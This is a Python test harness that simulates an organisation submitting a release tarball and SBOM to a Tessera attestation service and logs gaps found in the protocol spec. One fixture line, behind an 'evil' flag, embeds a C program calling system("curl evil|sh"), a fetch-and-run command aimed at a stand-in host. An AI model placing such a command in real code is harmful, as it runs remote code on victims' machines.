"""Consumer 1: the SUBMITTER (THROWAWAY).

An organisation ("Acme") wants a release attested: a source tarball plus a CycloneDX-style SBOM.
It holds: the two files, its own name, and the service's issuance interface (here the phase-1
`Issuer`, in-process). It also holds the public reference verifier and the trust configuration that
ships with it, as any member of the public would.

It does NOT hold: any Tessera key, any service-internal state, or any knowledge of the frame layout
beyond what the reference library exposes. Every point where it needs more is logged.
"""
from __future__ import annotations

import copy
import hashlib
import io
import json
import tarfile
from dataclasses import dataclass, field

from tessera_proto import frame, jcs
from tessera_proto.crypto import b64d
from tessera_proto.issuer import ChainSchedule, IssuanceResult
from tessera_proto.verifier import verify_bundle

from .log import BLOCKED, CONFUSED, NOTE, WORKED, ConsumerLog

HOUR = 3600


# ------------------------------------------------------------------ the release artifacts

def make_tarball(files: dict[str, bytes]) -> bytes:
    """A deterministic in-memory .tar.gz (mtime 0) so digests are stable across runs."""
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w", format=tarfile.USTAR_FORMAT) as tf:
        for name in sorted(files):
            ti = tarfile.TarInfo(name)
            ti.size, ti.mtime, ti.mode = len(files[name]), 0, 0o644
            tf.addfile(ti, io.BytesIO(files[name]))
    import gzip
    return gzip.compress(raw.getvalue(), mtime=0)


def make_sbom(component: str, version: str, tar_sha256: str, cvss: float = 9.8) -> bytes:
    """A small CycloneDX-1.5-shaped SBOM. Realistic detail: a vulnerability rating with a CVSS
    base score, which CycloneDX encodes as a JSON *number* (9.8)."""
    doc = {
        "bomFormat": "CycloneDX", "specVersion": "1.5", "version": 1,
        "metadata": {"component": {"type": "application", "name": component, "version": version,
                                   "hashes": [{"alg": "SHA-256", "content": tar_sha256}]}},
        "components": [{"type": "library", "name": "zlib", "version": "1.3.1"}],
        "vulnerabilities": [{"id": "CVE-2022-37434", "ratings": [{"method": "CVSSv31", "score": cvss}],
                             "analysis": {"state": "not_affected"}}],
    }
    return json.dumps(doc, indent=2).encode()


def sha256_hex(b: bytes) -> str:
    return hashlib.sha256(b).hexdigest()


@dataclass
class Release:
    name: str
    version: str
    tarball: bytes
    sbom: bytes

    @property
    def tar_name(self) -> str:
        return f"{self.name}-{self.version}.tar.gz"

    @property
    def sbom_name(self) -> str:
        return f"{self.name}-{self.version}.cdx.json"


def acme_release(version: str = "1.4.2", evil: bool = False) -> Release:
    body = b"int main(void){return 0;}\n" if not evil else b"int main(void){system(\"curl evil|sh\");}\n"
    tb = make_tarball({f"widget-{version}/main.c": body, f"widget-{version}/README": b"Acme widget\n"})
    return Release("acme-widget", version, tb, make_sbom("acme-widget", version, sha256_hex(tb)))


# ------------------------------------------------------------------ what the service delivers

@dataclass
class Delivery:
    """What actually reaches the submitter, and when (stub-chain seconds)."""
    at: int
    kind: str          # "SHIPPED_BUNDLE" | "STANDING_EVIDENCE" | "REFUSAL"
    body: dict


def deliveries_from(res: IssuanceResult) -> list[Delivery]:
    """Translate the phase-1 issuer's in-process result into messages a submitter would receive.

    The phase-1 issuer attaches the TLR to every attempt bundle after the fact. Per R-4.88(iv)
    ("complete standing evidence is late by construction") the bundle at ship cannot contain it, so
    the shipped bundle is delivered WITHOUT `standing`, and the TLR follows as a second message once
    its own anchor is buried. NOTE: the spec names no delivery channel for this second message.
    """
    out: list[Delivery] = []
    if res.disposition == "SHIPPED":
        b = copy.deepcopy(res.shipped)
        b.pop("standing", None)
        ship_at = b["layers"][0]["anchor"]["headers"][-1]["time"]
        out.append(Delivery(ship_at, "SHIPPED_BUNDLE", b))
    else:
        out.append(Delivery(0, "REFUSAL", copy.deepcopy(res.refusal_record or {})))
    if res.tlr:
        out.append(Delivery(res.tlr["anchor"]["headers"][-1]["time"], "STANDING_EVIDENCE", copy.deepcopy(res.tlr)))
    return out


# ------------------------------------------------------------------ the submitter

@dataclass
class SubmitOutcome:
    accepted_payload: bytes | None
    rejection: str | None
    result: IssuanceResult | None
    deliveries: list[Delivery] = field(default_factory=list)


class Submitter:
    def __init__(self, org: str, issuer, trust):
        self.org = org
        self.issuer = issuer        # the service's issuance interface
        self.trust = trust          # trust configuration shipped with the public reference verifier
        self.log = ConsumerLog("submitter")

    # ---- step 1: what must it supply?
    def statement_inline(self, rel: Release) -> bytes:
        """First attempt: put the SBOM itself in the payload (it is JSON, after all)."""
        return json.dumps({"statement_type": "acme/release-attestation/0", "org": self.org,
                           "release": {"name": rel.name, "version": rel.version},
                           "artifacts": [{"name": rel.tar_name, "sha256": sha256_hex(rel.tarball)}],
                           "sbom": json.loads(rel.sbom)}, indent=2).encode()

    def statement_digests(self, rel: Release) -> bytes:
        """Fallback: a digest-only statement. Every value is a string (R-4.3)."""
        return json.dumps({"statement_type": "acme/release-attestation/0", "org": self.org,
                           "release": {"name": rel.name, "version": rel.version},
                           "artifacts": [{"name": rel.tar_name, "sha256": sha256_hex(rel.tarball)},
                                         {"name": rel.sbom_name, "sha256": sha256_hex(rel.sbom)}]},
                          indent=2).encode()

    def submit(self, rel: Release, now: int, schedules: list[ChainSchedule] | None = None) -> SubmitOutcome:
        L = self.log
        L.add(NOTE, "The tarball cannot be submitted at all: the payload domain is I-JSON only, so the "
                    "submitter must pre-hash binary artifacts and choose the hash itself; Tessera then "
                    "attests the digest statement, never the tarball", "R-4.1, R-4.2, R-3.52, R-1.2")
        L.add(NOTE, "Nothing identifies or authenticates the submitter: the protocol's actors are issuer, "
                    "verifier, adjudicator and custodian (§2.1). 'org' is a payload claim the issuer "
                    "signs without checking", "§2.1 actors table, R-1.1, R-1.4, R-5.58")
        L.add(BLOCKED, "'Requested issuance parameters' are consumed at step 1 but never enumerated, so "
                       "the submitter cannot request a binding-form set, a policy, or name itself as the "
                       "declared custodian of a refusal record", "§4.1 'Consumes', R-4.63")
        inline = self.statement_inline(rel)
        rejection = None
        try:
            self.issuer.ingest(inline)
            payload = inline
        except jcs.CanonicalizationRejected as e:
            rejection = e.code
            L.add(BLOCKED, f"Embedding the SBOM inline was refused ({e.code}): CycloneDX encodes the CVSS "
                           "score 9.8 as a JSON number, and 9.8 is not exactly a double. Under the literal "
                           "reading (GUESS G-03) every SBOM with a fractional CVSS score is refused; under "
                           "the round-trip reading it would pass. The submitter cannot tell which reading "
                           "a real service uses", "R-4.2, R-3.4, GUESSES G-03")
            payload = self.statement_digests(rel)
            L.add(WORKED, "A digest-only statement (strings only) is accepted", "R-4.3")
        res = self.issuer.issue(payload, now, schedules)
        out = SubmitOutcome(payload, rejection, res, deliveries_from(res))
        self._receive(out, now)
        return out

    # ---- step 2: what does it get back?
    def _receive(self, out: SubmitOutcome, now: int) -> None:
        L = self.log
        kinds = [d.kind for d in out.deliveries]
        if "REFUSAL" in kinds:
            L.add(BLOCKED, "Issuance was refused. What arrives is the phase-1 stub, not a portable refusal "
                           "record: no attempt identity, reasons or verifying evidence the submitter could "
                           "show an auditor", "R-4.61, R-4.62, GUESSES G-49")
            if out.result and out.result.attempts:
                L.add(CONFUSED, f"{len(out.result.attempts)} attempt bundle(s) exist service-side. The spec "
                                "does not say whether a submitter ever receives discarded attempts, or how "
                                "it would tell one from a shipped receipt without running the verifier",
                      "R-4.45, R-6.30 S2/S4")
            return
        ship = next(d for d in out.deliveries if d.kind == "SHIPPED_BUNDLE")
        L.add(NOTE, f"Shipped receipt arrives {(ship.at - now) / 60:.0f} min after submission (k = "
                    f"{self.trust.k} confirmations on the stub chain; real Bitcoin is ~60 min for k=6)",
              "R-2.2, R-4.77a")
        tl = [d for d in out.deliveries if d.kind == "STANDING_EVIDENCE"]
        if tl:
            L.add(CONFUSED, f"Standing evidence (the TLR) can only exist {(tl[0].at - ship.at) / 60:.0f} min "
                            "after the receipt ships. The spec says it is 'carried, not maintained' and "
                            "'everything the standing report needs is in the bundle', but names no channel "
                            "by which it reaches the holder and no state machine like the refusal record's",
                  "R-4.88(iv), R-4.91, R-2.9 vs R-4.63")
        L.add(CONFUSED, "R-4.88(ii) says a bundle that ships before confirmation carries a pending proof the "
                        "holder must upgrade; R-2.2 says a receipt never ships on a shallow anchor. The "
                        "submitter does not know whether to expect an upgrade duty", "R-4.88(ii), R-2.2")

    def receipt_at_ship(self, out: SubmitOutcome) -> dict:
        return next(d.body for d in out.deliveries if d.kind == "SHIPPED_BUNDLE")

    def complete_receipt(self, out: SubmitOutcome) -> dict:
        """Append the late TLR. The submitter must know the member name ('standing') -- an internal."""
        b = copy.deepcopy(self.receipt_at_ship(out))
        tl = [d for d in out.deliveries if d.kind == "STANDING_EVIDENCE"]
        if tl:
            b["standing"] = tl[0].body
            self.log.add(CONFUSED, "To complete the receipt the submitter has to splice the TLR into the bundle "
                                   "under a member name it can only learn from the implementation; the bundle "
                                   "format (member names, transport) is unspecified", "R-5.4, GUESSES G-26")
        return b

    # ---- step 3: can it check and understand what it holds?
    def self_check(self, bundle: dict, label: str, trust=None) -> dict:
        """`trust` defaults to the configuration the submitter fetched BEFORE submitting. Pass a
        refreshed one (a newer verifier release) to see the difference."""
        rep = verify_bundle(bundle, trust or self.trust)
        L0 = rep["layers"][0]
        st = L0.get("protocol_standing") or {}
        stale = [c for c, x in L0["checks"].items() if x.get("reason") == "HEADER_NOT_IN_TRUST_STORE"]
        if stale:
            self.log.add(CONFUSED, f"Self-check of the {label} receipt with the verifier release it already "
                                   f"had: {L0['verification']}, because the blocks that bury its own anchor are "
                                   "newer than that release's header store. Under the store-pin reading of "
                                   "header authentication, no receipt verifies until the holder obtains a newer "
                                   "verifier distribution", "R-2.19, R-5.8, V38 'not specified' (O-22), GUESSES G-31")
        else:
            self.log.add(NOTE, f"Self-check of the {label} receipt: verification={L0['verification']}, "
                               f"protocol_standing={st.get('value')}/{st.get('reason')}", "R-1.16, R-5.45")
        return rep

    def find_my_statement(self, bundle: dict, submitted: bytes) -> dict | None:
        L = self.log
        dump = json.dumps(bundle)
        my_digest = json.loads(submitted)["artifacts"][0]["sha256"]
        if my_digest not in dump:
            L.add(CONFUSED, "The receipt carries the statement only inside base64 frame bytes: the tarball "
                            "digest does not occur anywhere in the bundle as text, and the verifier's report "
                            "does not return the attested content. Reading back 'what was attested' needs the "
                            "frame layout and payload schema", "R-5.44, GUESSES G-01, G-15, G-26")
        s = bundle["layers"][0]["slots"][0]
        fr, _ = frame.decode(b64d(s["frame_b64"]))
        content = jcs.parse_strict(fr.payload)["common"]["content"]
        same_value = jcs.canonicalize(content) == jcs.canonicalize(jcs.parse_strict(submitted))
        same_bytes = jcs.canonicalize(content) == submitted
        if same_value and not same_bytes:
            L.add(CONFUSED, "What is attested is the JCS-canonical form, not the bytes the submitter sent: "
                            "sha256 of its own statement file matches nothing in the receipt. A third party "
                            "holding the original statement file must canonicalize before comparing",
                  "R-4.8, R-1.1, R-3.1")
        return content if same_value else None

    def portable_kit(self, bundle: dict, rel: Release) -> dict:
        """What the submitter would publish next to the release: the bundle plus file names. The bundle
        is one self-contained JSON object (it survives json round-trip), but its meaning for the
        files depends on the submitter's own statement schema, which nothing in the bundle defines."""
        self.log.add(NOTE, "The receipt is one JSON file the submitter can store and hand on without "
                           "understanding it; the relying party, however, needs the submitter's statement "
                           "schema to connect it to the tarball, and nothing in the bundle types or carries "
                           "that schema unless a Representation Information companion is used, which no "
                           "issuance input accepts", "R-3.52, R-7.7b, §4.1")
        return {"receipt": bundle, "files": [rel.tar_name, rel.sbom_name]}
